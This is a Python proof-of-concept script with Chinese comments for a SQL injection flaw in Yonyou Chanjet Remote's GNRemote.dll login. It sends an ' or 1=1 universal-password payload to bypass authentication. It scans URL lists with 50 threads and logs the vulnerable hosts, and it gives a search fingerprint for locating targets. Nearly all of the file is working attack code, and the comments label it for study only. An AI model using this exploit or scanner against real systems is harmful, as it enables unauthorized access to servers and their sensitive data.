# coding=utf-8
# 学习python，自己写的一些历史漏洞的poc，仅供学习参考，请勿用于非法用途，产生的法律风险由您自己负责。
# 参考链接：http://wiki.peiqi.tech/wiki/webapp/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B%20%E7%95%85%E6%8D%B7%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A%20GNRemote.dll%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
# 漏洞描述
# 用友 畅捷通远程通 GNRemote.dll SQL注入漏洞，攻击者通过SQL注入可以获取服务器敏感信息或者使用万能密码登录设备
# 漏洞影响
# 用友 畅捷通远程通
# 网络空间测绘
# body="远程通CHANJET_Remote"
# poc使用方法 python poc.py -u url 或 python poc.py -uf url.txt
import argparse
import re
from urllib.parse import urlparse
import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings()
obj = re.compile(r"{\"RetCode\":0}")


def cmdline(known=False):
    parser = argparse.ArgumentParser()
    parser.add_argument(
        '-u',
        '--url',
        help='-u http://test.com',
        type=str
    )
    parser.add_argument(
        '-uf',
        '--urlfile',
        help='-uf 1.txt',
        type=str
    )

    opt = parser.parse_args()
    if opt.urlfile:

        urls = open(opt.urlfile).readlines()
        with ThreadPoolExecutor(50) as t:
            for url in urls:
                t.submit(poc_func, url=url.replace("\n", ""))
    elif opt.url:
        poc_func(opt.url)
    else:
        file_poc_func(str(opt.url))


def file_poc_func(url):
    print(url + "加载失败!")


def poc_func(url):
    # poc的payload
    payload = "/GNRemote.dll?GNFunction=LoginServer&decorator=text_wrap&frombrowser=esl"
    head = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
    }
    data = "username=%22'%20or%201%3d1%3b%22&password=%018d8cbc8bfc24f018&ClientStatus=1"
    # 解析url
    parsed_result = urlparse(url)
    # 拼接payload
    poc_url = f"{parsed_result.scheme}://{parsed_result.netloc}{payload}"
    try:
        # 发送payload
        print(poc_url)
        send_poc = requests.post(poc_url, verify=False, timeout=5, data=data, headers=head)
        print(send_poc.text)
        # 解析结果并返回
        if not len(obj.findall(send_poc.text)) == 0:
            print(f"\033[1;31m{url}存在漏洞!\033[0m")
            save_result(f"{url}存在漏洞!\n")

    except:
        # print(url + "检测异常")
        pass
        return


def save_result(str):
    with open('result.txt', 'a+') as f:
        f.write(str)
    f.close()


if __name__ == '__main__':
    cmdline()
# 学习python，自己写的一些历史漏洞的poc，仅供学习参考，请勿用于非法用途，产生的法律风险由您自己负责。
